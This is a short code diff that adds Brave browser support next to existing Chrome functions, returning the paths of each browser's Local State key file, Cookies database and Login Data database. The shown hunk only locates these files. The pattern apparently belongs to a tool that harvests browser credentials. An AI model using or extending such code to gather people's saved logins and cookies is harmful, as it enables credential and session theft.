@@ -36,12 +36,27 @@ def chrome_exists():
     return os.path.exists(f"{LOCAL}/Google/Chrome/User Data")
 
 
+def brave_exists():
+    LOCAL = os.environ['LOCALAPPDATA']
+    return os.path.exists(f"{LOCAL}/BraveSoftware/Brave-Browser/User Data/")
+
+
 def get_chrome_directories():
     LOCAL = os.environ['LOCALAPPDATA']
     chrome_dir = f"{LOCAL}/Google/Chrome/User Data/"
     key_directory = f"{chrome_dir}/Local State"
     cookie_directory = f"{chrome_dir}/Default/Cookies"
     login_directory = f"{chrome_dir}/Default/Login Data"
+
+    return key_directory, cookie_directory, login_directory
+
+
+def get_brave_directories():
+    LOCAL = os.environ['LOCALAPPDATA']
+    brave_dir = f"{LOCAL}/BraveSoftware/Brave-Browser/User Data/"
+    key_directory = f"{brave_dir}/Local State"
+    cookie_directory = f"{brave_dir}/Default/Cookies"
+    login_directory = f"{brave_dir}/Default/Login Data"
 
     return key_directory, cookie_directory, login_directory
 
